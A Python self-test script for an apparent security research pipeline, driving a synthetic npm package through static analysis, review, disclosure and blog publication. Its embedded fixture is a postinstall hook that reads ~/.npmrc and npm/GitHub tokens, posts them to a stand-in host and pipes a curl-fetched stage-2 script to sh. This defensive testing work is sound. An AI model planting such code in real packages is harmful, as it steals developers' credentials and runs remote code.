#!/usr/bin/env python3
"""End-to-end self-test of the research-to-publication pipeline.

Runs every gate from intake to a published post against an inert positive
control (a synthetic credential-exfiltration npm package that is only ever
inspected statically) in a throwaway workspace.  Nothing touches the
production ledger, the real blog, or any network service.

    python scripts/research_selftest.py            # full run, prints a report
    python scripts/research_selftest.py --skip-visual-qa   # no Chromium available
    python scripts/research_selftest.py --keep      # keep the workspace for inspection

Exit status is 0 only when every step passes.
"""

from __future__ import annotations

import argparse
import json
import os
import shutil
import subprocess
import sys
import tarfile
import tempfile
import time
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

PACKAGE_JSON = {
    "name": "synthetic-exfil-demo",
    "version": "1.0.1",
    "description": "SecOpsAI positive-control fixture (inert, never executed)",
    "scripts": {"postinstall": "node setup.js"},
}
SETUP_JS = """// SecOpsAI positive-control fixture. Inert: static analysis only, never run.
const os = require("os");
const fs = require("fs");
const https = require("https");
const { execSync } = require("child_process");
const home = os.homedir();
const npmrc = fs.readFileSync(home + "/.npmrc", "utf8");
const token = process.env.NPM_TOKEN || process.env.GITHUB_TOKEN;
const body = Buffer.from(JSON.stringify({ host: os.hostname(), npmrc, token })).toString("base64");
https.request("https://collector.exfil-demo.invalid/v1/upload", { method: "POST" }).end(body);
execSync("curl -s https://collector.exfil-demo.invalid/stage2.sh | sh -c");
"""
RELIABILITY_STEPS = [
    "plan", "run-scaffold", "verify-transition", "run-full",
    "verify-claims", "audit-completeness", "audit-originality", "queue-specialist",
]


class SelfTest:
    def __init__(self, work: Path) -> None:
        self.work = work
        self.db = work / "research.db"
        self.results: List[Dict[str, Any]] = []
        self.case_id = ""
        self.evidence_id = ""

    def cli(self, *args: str, expect_error: bool = False) -> Dict[str, Any]:
        env = {**os.environ, "SECOPSAI_RESEARCH_QUARANTINE": str(self.work / "quarantine")}
        # The self-test must never reach Core or alert channels.
        for key in ("SECOPSAI_CORE_BRIDGE_TOKEN", "SECOPSAI_CORE_COORDINATOR_URL", "SECOPSAI_LEDGER_EXPORT_URL"):
            env.pop(key, None)
        proc = subprocess.run(
            [sys.executable, "-m", "secopsai.cli", "--json", *args],
            cwd=str(ROOT), env=env, capture_output=True, text=True, timeout=600,
        )
        try:
            payload = json.loads(proc.stdout or "{}")
        except json.JSONDecodeError:
            payload = {"error": (proc.stdout or proc.stderr)[-400:]}
        if proc.returncode != 0 and not expect_error and "error" not in payload:
            payload["error"] = proc.stderr[-400:]
        return payload if isinstance(payload, dict) else {"result": payload}

    def step(self, name: str, check: Callable[[], Optional[str]]) -> bool:
        started = time.monotonic()
        try:
            detail = check()
            ok = True
        except AssertionError as exc:
            ok, detail = False, str(exc)
        except Exception as exc:  # report, keep going
            ok, detail = False, f"{type(exc).__name__}: {exc}"
        self.results.append({"step": name, "ok": ok, "detail": detail or "", "seconds": round(time.monotonic() - started, 1)})
        return ok

    def build_fixture(self) -> Path:
        src = self.work / "src" / "package"
        src.mkdir(parents=True)
        (src / "package.json").write_text(json.dumps(PACKAGE_JSON), encoding="utf-8")
        (src / "setup.js").write_text(SETUP_JS, encoding="utf-8")
        archive = self.work / "synthetic-exfil-demo-1.0.1.tgz"
        with tarfile.open(archive, "w:gz") as handle:
            handle.add(src, arcname="package")
        for name in ("quarantine", "reports", "sessions"):
            (self.work / name).mkdir()
        return archive

    def db_args(self) -> List[str]:
        return ["--db-path", str(self.db)]

    def run(self, visual_qa: bool) -> bool:
        archive = self.build_fixture()
        C = lambda: self.case_id  # noqa: E731

        def intake() -> str:
            d = self.cli(
                "research", "package", "--ecosystem", "npm", "--package", "synthetic-exfil-demo",
                "--version", "1.0.1", "--artifact", str(archive), "--research-type", "malicious_package",
                "--source-reference", "https://secopsai.dev/research/positive-control",
                *self.db_args(), "--artifact-db-path", str(self.work / "artifacts.db"),
                "--report-dir", str(self.work / "reports"), "--session-dir", str(self.work / "sessions"),
            )
            assert not d.get("error"), d.get("error")
            rules = sorted({f.get("rule_id") for f in (d.get("scan") or {}).get("findings", [])})
            assert d.get("case_id"), f"no case opened (verdict={d.get('verdict')}, rules={rules})"
            assert d.get("evidence_ids"), "no EVD- evidence ids returned"
            self.case_id, self.evidence_id = d["case_id"], d["evidence_ids"][0]
            return f"{self.case_id}; {len(rules)} rules: {', '.join(rules[:6])}"

        if not self.step("intake: static analysis opens a case", intake):
            return False

        def matrix() -> str:
            d = self.cli("research", "workflow", "evidence-matrix", C(), *self.db_args())
            assert not d.get("error"), d.get("error")
            brief = self.cli("research", "workflow", "analyst-brief", C(), *self.db_args())
            assert not brief.get("error"), brief.get("error")
            return "evidence matrix and analyst brief generated"

        self.step("evidence matrix + analyst brief", matrix)

        def verdict() -> str:
            d = self.cli(
                "research", "workflow", "verdict", C(), "--verdict", "likely", "--confidence", "80",
                "--rationale", "Positive control: postinstall reads ~/.npmrc and NPM_TOKEN, base64-encodes them, posts them to an external host and pipes a stage-2 script to sh. Static only; not executed.",
                "--evidence-id", self.evidence_id, "--actor", "selftest-analyst", *self.db_args(),
            )
            assert not d.get("error"), d.get("error")
            return f"likely/80 on {self.evidence_id}"

        self.step("verdict bound to case evidence", verdict)

        def reliability() -> str:
            failed = []
            for name in RELIABILITY_STEPS:
                d = self.cli("research", "reliability", name, C(), "--actor", "selftest-analyst", *self.db_args())
                if d.get("error") or str(d.get("status", "")).lower() in {"failed", "error", "blocked"}:
                    failed.append(f"{name}: {d.get('error') or d.get('status')}")
            assert not failed, "; ".join(failed)
            return f"{len(RELIABILITY_STEPS)} steps"

        self.step("reliability chain", reliability)

        def reviews() -> str:
            primary = self.cli(
                "research", "reliability", "human-review", C(), "--stage", "primary", "--verdict", "likely",
                "--reviewer", "selftest-primary", "--evidence-id", self.evidence_id,
                "--summary", "Install hook reads ~/.npmrc and NPM_TOKEN, base64-encodes them and posts them out.", *self.db_args(),
            )
            assert not primary.get("error"), primary.get("error")
            same = self.cli(
                "research", "reliability", "human-review", C(), "--stage", "reviewer", "--verdict", "likely",
                "--reviewer", "SELFTEST-PRIMARY", "--evidence-id", self.evidence_id,
                "--summary", "The same person must not be accepted as the independent reviewer.", *self.db_args(),
                expect_error=True,
            )
            assert same.get("error"), "same-person independent review was accepted"
            independent = self.cli(
                "research", "reliability", "human-review", C(), "--stage", "reviewer", "--verdict", "likely",
                "--reviewer", "selftest-reviewer", "--evidence-id", self.evidence_id,
                "--summary", "Independently confirmed the credential read, base64 staging and outbound POST.", *self.db_args(),
            )
            assert not independent.get("error"), independent.get("error")
            return "primary + blinded independent review; same-person review refused"

        self.step("specialist + independent review", reviews)

        if visual_qa:
            def vqa() -> str:
                d = self.cli(
                    "research", "reliability", "visual-qa", C(), "--auto",
                    "--preview-dir", str(self.work / "preview"), "--actor", "selftest-renderer", *self.db_args(),
                )
                assert not d.get("error"), d.get("error")
                status = str(d.get("status") or d.get("result") or "")
                assert "fail" not in status.lower(), json.dumps(d)[:300]
                return status or "passed"

            self.step("visual QA (1280px + 390px)", vqa)

        def publication_gates() -> str:
            check = self.cli("research", "workflow", "publication-check", C(), *self.db_args())
            if not visual_qa:
                # Without a rendered visual QA the gate must refuse publication.
                assert any("visual qa" in str(item).lower() for item in check.get("blockers") or []), f"publication not blocked: {check.get('blockers')}"
                return "blocked until visual QA passes (expected with --skip-visual-qa)"
            assert not check.get("blockers"), f"blockers: {check.get('blockers')}"
            disclosure = self.cli("research", "workflow", "prepare-disclosure", C(), "--recipient", "security@example.invalid", *self.db_args())
            assert not disclosure.get("error"), disclosure.get("error")
            again = self.cli("research", "workflow", "prepare-disclosure", C(), "--recipient", "security@example.invalid", *self.db_args())
            assert again.get("disclosure_id") == disclosure.get("disclosure_id"), "re-preparing created a duplicate disclosure"
            for args in (
                ["research", "case", "update", C(), "--disclosure-status", "not_required", "--actor", "selftest-analyst"],
                ["research", "workflow", "publication-approve", C(), "--actor", "selftest-editor"],
                ["research", "case", "update", C(), "--status", "ready_to_publish", "--actor", "selftest-editor"],
            ):
                d = self.cli(*args, *self.db_args())
                assert not d.get("error"), f"{' '.join(args[:3])}: {d.get('error')}"
            return "check, disclosure draft (deduplicated), approval, ready_to_publish"

        self.step("publication check, disclosure, approval", publication_gates)

        def draft_and_publish() -> str:
            from secopsai import blog

            blog_root = self.work / "blog"
            shutil.copytree(ROOT / "blog", blog_root, ignore=shutil.ignore_patterns("drafts"))
            (blog_root / "drafts").mkdir()
            before = set((ROOT / "blog" / "drafts").glob("*.json")) if (ROOT / "blog" / "drafts").exists() else set()
            d = self.cli("research", "case", "draft-blog", C(), *self.db_args())
            assert not d.get("error"), d.get("error")
            created = set((ROOT / "blog" / "drafts").glob("*.json")) - before
            assert created, "draft-blog produced no draft file"
            draft = blog_root / "drafts" / next(iter(created)).name
            shutil.move(str(next(iter(created))), draft)  # keep the real drafts folder clean
            paths = blog.BlogPaths(blog_root)
            blog.publish(str(draft), confirm=True, paths=paths)
            feed = json.loads((blog_root / "feed.json").read_text(encoding="utf-8"))
            assert any("synthetic-exfil-demo" in item.get("url", "") for item in feed.get("items", [])), "post missing from JSON feed"
            assert "synthetic-exfil-demo" in (blog_root / "feed.xml").read_text(encoding="utf-8"), "post missing from RSS"
            assert "synthetic-exfil-demo" in (blog_root / "sitemap.xml").read_text(encoding="utf-8"), "post missing from sitemap"
            failing = [item for item in blog.quality_audit(paths=paths).get("failing") or [] if "synthetic-exfil-demo" in str(item.get("slug"))]
            assert not failing, f"published post fails the quality gate: {failing[0].get('blockers')}"
            return "published to an isolated blog copy; feeds, sitemap and quality gate pass"

        if visual_qa:
            self.step("draft, publish, feeds", draft_and_publish)
        return all(item["ok"] for item in self.results)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--skip-visual-qa", action="store_true", help="skip the headless Chromium rendering step")
    parser.add_argument("--keep", action="store_true", help="keep the workspace and print its path")
    parser.add_argument("--json", action="store_true", help="print the report as JSON")
    args = parser.parse_args()
    work = Path(tempfile.mkdtemp(prefix="secopsai-selftest-"))
    test = SelfTest(work)
    try:
        ok = test.run(visual_qa=not args.skip_visual_qa)
    finally:
        if not args.keep:
            shutil.rmtree(work, ignore_errors=True)
    report = {"status": "passed" if ok else "failed", "case_id": test.case_id, "steps": test.results}
    if args.keep:
        report["workspace"] = str(work)
    if args.json:
        print(json.dumps(report, indent=2))
    else:
        for item in test.results:
            print(f"{'PASS' if item['ok'] else 'FAIL'}  {item['step']:<42} {item['seconds']:>6}s  {item['detail']}")
        print(f"\n{report['status'].upper()}" + (f"  (workspace: {work})" if args.keep else ""))
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
